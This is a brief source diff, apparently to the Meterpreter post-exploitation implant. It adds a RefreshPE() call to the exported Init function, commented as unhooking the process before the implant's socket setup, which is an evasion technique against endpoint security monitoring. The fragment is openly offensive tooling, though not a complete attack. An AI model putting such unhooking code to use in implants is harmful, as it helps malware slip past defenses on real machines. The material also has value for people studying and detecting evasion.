@@ -8,6 +8,9 @@
 
 DWORD __declspec(dllexport) Init(SOCKET fd)
 {
+	// Unhook the process before setting up the socket
+	RefreshPE();
+
 	// In the case of metsrv payloads, the parameter passed to init is NOT a socket, it's actually
 	// a pointer to the metserv configuration, so do a nasty cast and move on.
 	MetsrvConfig* metConfig = (MetsrvConfig*)fd;
